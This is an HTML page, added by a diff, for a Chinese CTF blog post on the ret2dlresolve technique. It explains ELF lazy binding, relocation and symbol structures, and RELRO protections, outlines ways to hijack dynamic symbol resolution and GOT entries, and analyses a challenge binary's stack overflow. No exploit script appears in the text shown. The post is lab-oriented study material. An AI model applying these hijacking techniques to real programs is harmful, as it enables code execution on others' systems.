@@ -1,0 +1,552 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 8.0.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/meow.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/meow.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <meta name="google-site-verification" content="ytiTpj8Ol2naa1JDTwZxRYelNQFe4fgRvG5XcJmZ9N0">
+  <meta name="msvalidate.01" content="2B6959B722A9727D346D9795E31C5112">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"mintind.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.27.0","exturl":true,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"always","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"tokyo-night-dark","dark":"tokyo-night-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":true,"style":"flat"},"fold":{"enable":true,"height":500},"language":true},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="一无所有的此刻有亿万阵风吹过">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Return to dl_resolve">
+<meta property="og:url" content="https://mintind.github.io/2026/04/07/CTF/PWN/return_to_dl_resolve/index.html">
+<meta property="og:site_name" content="Mintind&#39;s Blog">
+<meta property="og:description" content="一无所有的此刻有亿万阵风吹过">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://mintind.github.io/2026/04/07/CTF/PWN/return_to_dl_resolve/image-20260408213917740.png">
+<meta property="og:image" content="https://mintind.github.io/2026/04/07/CTF/PWN/return_to_dl_resolve/image-20260408165543113.png">
+<meta property="article:published_time" content="2026-04-07T16:00:00.000Z">
+<meta property="article:modified_time" content="2026-04-07T16:00:00.000Z">
+<meta property="article:author" content="Mintind">
+<meta property="article:tag" content="PWN">
+<meta property="article:tag" content="ret2dlresolve">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://mintind.github.io/2026/04/07/CTF/PWN/return_to_dl_resolve/image-20260408213917740.png">
+
+
+<link rel="canonical" href="https://mintind.github.io/2026/04/07/CTF/PWN/return_to_dl_resolve/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://mintind.github.io/2026/04/07/CTF/PWN/return_to_dl_resolve/","path":"2026/04/07/CTF/PWN/return_to_dl_resolve/","title":"Return to dl_resolve"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Return to dl_resolve | Mintind's Blog</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script><script src="/js/bookmark.js" defer></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.5.0/search.js" integrity="sha256-xFC6PJ82SL9b3WkGjFavNiA9gm5z6UBxWPiu4CYjptg=" crossorigin="anonymous" defer></script>
+<script src="/js/third-party/search/local-search.js" defer></script>
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Mintind's Blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">此心安处是吾乡</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">60</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">16</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">80</span></a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="搜索..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A"><span class="nav-number">1.</span> <span class="nav-text">延迟绑定</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#dl-runtime-resolve"><span class="nav-number">1.1.</span> <span class="nav-text">_dl_runtime_resolve</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A1%A8%E9%A1%B9"><span class="nav-number">1.2.</span> <span class="nav-text">表项</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Elf32-Dyn"><span class="nav-number">1.2.1.</span> <span class="nav-text">Elf32_Dyn</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%87%8D%E5%AE%9A%E4%BD%8D%E8%A1%A8%E9%A1%B9Elf32-Rel"><span class="nav-number">1.2.2.</span> <span class="nav-text">重定位表项Elf32_Rel</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%AC%A6%E5%8F%B7%E8%A1%A8%E9%A1%B9Elf32-Sym"><span class="nav-number">1.2.3.</span> <span class="nav-text">符号表项Elf32_Sym</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B6%89%E5%8F%8A%E7%9A%84%E8%8A%82%EF%BC%88Section%EF%BC%89"><span class="nav-number">1.3.</span> <span class="nav-text">涉及的节（Section）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%EF%BC%9AGOT-Overwrite"><span class="nav-number">1.4.</span> <span class="nav-text">攻击方式：GOT Overwrite</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Relocation-Read-Only-RELRO"><span class="nav-number">2.</span> <span class="nav-text">Relocation Read-Only (RELRO)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Partial-RELRO"><span class="nav-number">2.1.</span> <span class="nav-text">Partial RELRO</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Full-RELRO"><span class="nav-number">2.2.</span> <span class="nav-text">Full RELRO</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ret2dlresolve"><span class="nav-number">3.</span> <span class="nav-text">ret2dlresolve</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9D%BF%E5%AD%90"><span class="nav-number">3.1.</span> <span class="nav-text">板子</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%A2%98-ret2dl"><span class="nav-number">4.</span> <span class="nav-text">题-ret2dl</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90"><span class="nav-number">4.1.</span> <span class="nav-text">程序分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF"><span class="nav-number">4.2.</span> <span class="nav-text">解题思路</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#payload1"><span class="nav-number">4.2.1.</span> <span class="nav-text">payload1</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#payload2"><span class="nav-number">4.2.2.</span> <span class="nav-text">payload2</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%B0%83%E8%AF%95%E7%9A%84%E4%B8%80%E4%BA%9B%EF%BC%9A"><span class="nav-number">4.2.3.</span> <span class="nav-text">调试的一些：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#exp"><span class="nav-number">4.2.4.</span> <span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8A%80%E6%9C%AF%E7%82%B9%E6%80%BB%E7%BB%93"><span class="nav-number">4.3.</span> <span class="nav-text">技术点总结</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Mintind</p>
+  <div class="site-description" itemprop="description">Record to Remember</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">80</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">16</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">60</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL21pbnRpbmQ=" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;mintind"><i class="fab fa-github fa-fw"></i>GitHub</span>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://mintind.github.io/2026/04/07/CTF/PWN/return_to_dl_resolve/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Mintind">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Mintind's Blog">
+      <meta itemprop="description" content="Record to Remember">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Return to dl_resolve | Mintind's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Return to dl_resolve<span class="exturl post-edit-link" data-url="aHR0cHM6Ly9naXRodWIuY29tL01pbnRpbmQvbWludGluZC1oZXhvLWJsb2cvZWRpdC9tYWluL3NvdXJjZS9fcG9zdHMvQ1RGL1BXTi9yZXR1cm5fdG9fZGxfcmVzb2x2ZS5tZA==" title="编辑"><i class="fa fa-pen-nib"></i></span>
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2026-04-08 00:00:00" itemprop="dateCreated datePublished" datetime="2026-04-08T00:00:00+08:00">2026-04-08</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>2.4k</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p><code>一无所有的此刻有亿万阵风吹过</code></p>
+<span id="more"></span>
+
+<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vR0tMQkIvcC8xOTYwMzI4Mg==">https://www.cnblogs.com/GKLBB/p/19603282<i class="fa fa-external-link-alt"></i></span></p>
+<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vdW5yNHYzMS9wLzE1MTY4MzQyLmh0bWw=">https://www.cnblogs.com/unr4v31/p/15168342.html<i class="fa fa-external-link-alt"></i></span></p>
+<h2 id="延迟绑定"><a href="#延迟绑定" class="headerlink" title="延迟绑定"></a>延迟绑定</h2><p>之前好像记过一次但是时间紧迫不找在哪了先复习一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">第一次调用 printf():</span><br><span class="line">  PLT → GOT(此时存的是PLT+6的地址) → 跳回PLT → 调用dl_runtime_resolve()</span><br><span class="line">       → 解析真实地址 → 写入GOT → 跳转到printf()</span><br><span class="line"></span><br><span class="line">第二次调用 printf():</span><br><span class="line">  PLT → GOT(此时已是真实地址) → 直接跳转到printf()</span><br></pre></td></tr></table></figure>
+
+<p>关键问题：<strong>GOT 表必须可写</strong>，因为动态链接器需要在运行时填入解析后的地址。</p>
+<h3 id="dl-runtime-resolve"><a href="#dl-runtime-resolve" class="headerlink" title="_dl_runtime_resolve"></a>_dl_runtime_resolve</h3><p>函数原型</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_dl_runtime_resolve(link_map_obj, reloc_index)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/04/07/CTF/PWN/return_to_dl_resolve/image-20260408213917740.png" alt="image-20260408213917740"></p>
+<p>解析器的工作流程：</p>
+<ol>
+<li>读取 .dynamic 节，找到 .rel.plt &#x2F; .dynsym &#x2F; .dynstr 的基址</li>
+<li>根据reloc_offset这个偏移量在.rel.plt中找到重定位表项Elf32_Rel</li>
+<li>根据其中的r_info提取出 下标 (Index)，然后通过 <code>symtab_base + Index * 16</code> 来定位 <code>Elf32_Sym</code>。</li>
+<li>其中的st_name指向函数名</li>
+</ol>
+<h3 id="表项"><a href="#表项" class="headerlink" title="表项"></a>表项</h3><h4 id="Elf32-Dyn"><a href="#Elf32-Dyn" class="headerlink" title="Elf32_Dyn"></a>Elf32_Dyn</h4><p>8字节</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf32_Sword d_tag;   <span class="comment">// 类型标签（你是谁？）</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        Elf32_Word d_val; <span class="comment">// 数值</span></span><br><span class="line">        Elf32_Addr d_ptr; <span class="comment">// 地址指针（你在哪？）</span></span><br><span class="line">    &#125; d_un;</span><br><span class="line">&#125; Elf32_Dyn;</span><br></pre></td></tr></table></figure>
+
+<p>_dl_runtime_resolve获取的基址：</p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>d_tag</th>
+<th>d_un（d_ptr）</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>DT_STRTAB</td>
+<td>5</td>
+<td>.dynstr 字符串表基址</td>
+</tr>
+<tr>
+<td>DT_SYMTAB</td>
+<td>6</td>
+<td>.dynsym 符号表基址</td>
+</tr>
+<tr>
+<td>DT_JMPREL</td>
+<td>23 (0x17)</td>
+<td>.rel.plt 重定位表基址</td>
+</tr>
+</tbody></table>
+<h4 id="重定位表项Elf32-Rel"><a href="#重定位表项Elf32-Rel" class="headerlink" title="重定位表项Elf32_Rel"></a>重定位表项Elf32_Rel</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf32_Addr r_offset; <span class="comment">// 写入目标地址</span></span><br><span class="line">    Elf32_Word r_info;   <span class="comment">// 包含符号表下标和重定位类型</span></span><br><span class="line">&#125; Elf32_Rel;</span><br></pre></td></tr></table></figure>
+
+<p><strong><code>r_info</code> 的计算：<code>((index) &lt;&lt; 8 | 0x7)</code></strong></p>
+<ul>
+<li><p>index：告诉解析器去符号表.dynsym的第几个槽位读 <code>Elf32_Sym</code>。</p>
+</li>
+<li><p><strong><code>0x7</code></strong>：这是 <code>R_386_JMP_SLOT</code>，告诉解析器这是一个函数跳转槽位。</p>
+</li>
+<li><p><strong><code>&lt;&lt; 8</code></strong>：<code>r_info</code> 的高 24 位存放的是该符号在符号表（Symbol Table）里的下标（Index）。</p>
+</li>
+</ul>
+<h4 id="符号表项Elf32-Sym"><a href="#符号表项Elf32-Sym" class="headerlink" title="符号表项Elf32_Sym"></a>符号表项Elf32_Sym</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf32_Word st_name;  <span class="comment">// 符号名在字符串表.dynstr中的偏移</span></span><br><span class="line">    Elf32_Addr st_value; </span><br><span class="line">    Elf32_Word st_size;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> st_info; <span class="comment">// 符号类型</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> st_other;</span><br><span class="line">    Elf32_Section st_shndx;</span><br><span class="line">&#125; Elf32_Sym;</span><br></pre></td></tr></table></figure>
+
+<h3 id="涉及的节（Section）"><a href="#涉及的节（Section）" class="headerlink" title="涉及的节（Section）"></a>涉及的节（Section）</h3><p><strong>.dynamic动态节（Dynamic Section）</strong></p>
+<p>存放<code>Elf32_Dyn</code> 结构体。</p>
+<p><strong>JMPREL：.rel.plt (Relocation PLT)</strong></p>
+<p>重定位表。存放<code>Elf32_Rel</code> 结构体</p>
+<p><strong>SYMTAB：.dynsym (Dynamic Symbol Table)</strong></p>
+<p>动态符号表。存放<code>Elf32_Sym</code> 结构体。</p>
+<p><strong>STRTAB：.dynstr (Dynamic String Table)</strong></p>
+<p>动态字符串表。Elf32_Sym中的st_name会指向这里</p>
+<h3 id="攻击方式：GOT-Overwrite"><a href="#攻击方式：GOT-Overwrite" class="headerlink" title="攻击方式：GOT Overwrite"></a>攻击方式：GOT Overwrite</h3><p>将 GOT 中某个函数条目改为 system（目标函数） 的地址</p>
+<h2 id="Relocation-Read-Only-RELRO"><a href="#Relocation-Read-Only-RELRO" class="headerlink" title="Relocation Read-Only (RELRO)"></a>Relocation Read-Only (RELRO)</h2><p>将与重定位相关的内存区域（特别是 GOT 表）在运行时标记为只读</p>
+<h3 id="Partial-RELRO"><a href="#Partial-RELRO" class="headerlink" title="Partial RELRO"></a>Partial RELRO</h3><p>是gcc的默认设置</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">ELF 内存布局调整：</span><br><span class="line"></span><br><span class="line">┌─────────────────┐  低地址</span><br><span class="line">│    .text         │  只读</span><br><span class="line">├─────────────────┤</span><br><span class="line">│    .rodata       │  只读</span><br><span class="line">├─────────────────┤</span><br><span class="line">│    .got          │  ← 存放全局偏移（非函数）→ 只读 ✓</span><br><span class="line">├─────────────────┤</span><br><span class="line">│    .got.plt      │  ← 存放函数地址 → 仍然可写 ✗</span><br><span class="line">├─────────────────┤</span><br><span class="line">│    .data          │  可写</span><br><span class="line">│    .bss           │  可写</span><br><span class="line">└─────────────────┘  高地址</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>重新排列 ELF 段的顺序，将 <code>.got</code>、<code>.ctors</code>、<code>.dtors</code>、<code>.dynamic</code> 等节放在 <code>.data</code>&#x2F;<code>.bss</code> 之前</li>
+<li>对 <code>.got</code>（非函数引用的 GOT 条目）设置只读</li>
+<li><code>.got.plt</code>（函数引用的 GOT 条目）仍然可写 → 仍可被攻击</li>
+<li><code>.dynamic</code> 段被标记为只读（防止修改 <code>DT_STRTAB</code> 等攻击）</li>
+</ul>
+<h3 id="Full-RELRO"><a href="#Full-RELRO" class="headerlink" title="Full RELRO"></a>Full RELRO</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">程序启动时（加载阶段）：</span><br><span class="line"></span><br><span class="line">1. 动态链接器(ld.so)一次性解析所有函数符号</span><br><span class="line">2. 将所有解析后的地址填入 GOT 表</span><br><span class="line">3. 调用 mprotect() 将整个 GOT 标记为只读</span><br><span class="line"></span><br><span class="line">┌─────────────────┐  低地址</span><br><span class="line">│    .text         │  只读</span><br><span class="line">├─────────────────┤</span><br><span class="line">│    .rodata       │  只读</span><br><span class="line">├─────────────────┤</span><br><span class="line">│    .got          │  只读 ✓（合并了所有GOT条目）</span><br><span class="line">├─────────────────┤</span><br><span class="line">│    .data          │  可写</span><br><span class="line">│    .bss           │  可写</span><br><span class="line">└─────────────────┘  高地址</span><br><span class="line"></span><br><span class="line">注意：.got.plt 不再需要，或也被设为只读</span><br></pre></td></tr></table></figure>
+
+<p>整个 GOT 表只读，GOT Overwrite 攻击完全失效</p>
+<p>其实就是直接不用延迟绑定了</p>
+<h2 id="ret2dlresolve"><a href="#ret2dlresolve" class="headerlink" title="ret2dlresolve"></a>ret2dlresolve</h2><p><span class="exturl" data-url="aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9zdGFja292ZXJmbG93L3g4Ni9hZHZhbmNlZC1yb3AvcmV0MmRscmVzb2x2ZS8=">https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/ret2dlresolve/<i class="fa fa-external-link-alt"></i></span></p>
+<p>如何攻击动态链接过程？</p>
+<p><strong>思路1：修改动态字符串表 <code>.dynstr</code></strong></p>
+<p>直接改不可行，动态字符串表 .dynstr是只读的。</p>
+<p>但是可以造假表，<strong>劫持 <code>reloc_offset</code></strong> 让解析器去读我们的假表</p>
+<p><strong>思路2：修改<code>.dynamic</code> 节</strong></p>
+<p>动态链接器会从 <code>.dynamic</code> 节中索引到各个目标节，可以劫持 .dynamic 里的指针 （基址）</p>
+<blockquote>
+<p>我开始理解大概是让基址指向，比如说.got.plt的中段，使得加上偏移后正好是目标函数的表项</p>
+<p>似乎更常用的是，将 DT_STRTAB 的 d_ptr 改为（加上偏移后是）目标函数字符串，或者改为自己伪造的字符串表地址</p>
+<p>直接移动基址会更加不可控，如果后面还要执行其他函数的话</p>
+</blockquote>
+<p>需要<code>.dynamic</code> 节可写。Partial RELRO就不可用</p>
+<p><strong>思路3：伪造 link_map</strong></p>
+<p>动态连接器在解析符号地址时，主要依赖于 link_map 来查询相关的地址。因此，如果我们可以成功伪造 link_map，也就可以控制程序执行目标函数。</p>
+<p>劫持 <code>PLT[0]</code> 的参数 <code>link_map</code> 地址，并且伪造一个完整的 <code>link_map</code> 结构体</p>
+<h3 id="板子"><a href="#板子" class="headerlink" title="板子"></a>板子</h3><p>做题看题之后发现，怎么全都要栈迁移啊</p>
+<h2 id="题-ret2dl"><a href="#题-ret2dl" class="headerlink" title="题-ret2dl"></a>题-ret2dl</h2><blockquote>
+<p>使用Gemini辅助分析和写脚本</p>
+</blockquote>
+<p>据说是板子题</p>
+<h3 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h3><p>用checksec查防护机制：</p>
+<p><img src="/2026/04/07/CTF/PWN/return_to_dl_resolve/image-20260408165543113.png" alt="image-20260408165543113"></p>
+<p>main函数非常简单，调用了alarm和read_w</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  alarm(<span class="number">0xAu</span>);</span><br><span class="line">  read_w();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>read_w中有一个栈溢出漏洞，但是溢出空间很小，只有24 字节</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">read_w</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE buf[<span class="number">40</span>]; <span class="comment">// [esp+0h] [ebp-28h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x40u</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>由于程序中没有system也没有puts等输出函数，并且只开了Partial RELRO，可以用ret2dlresolve。</p>
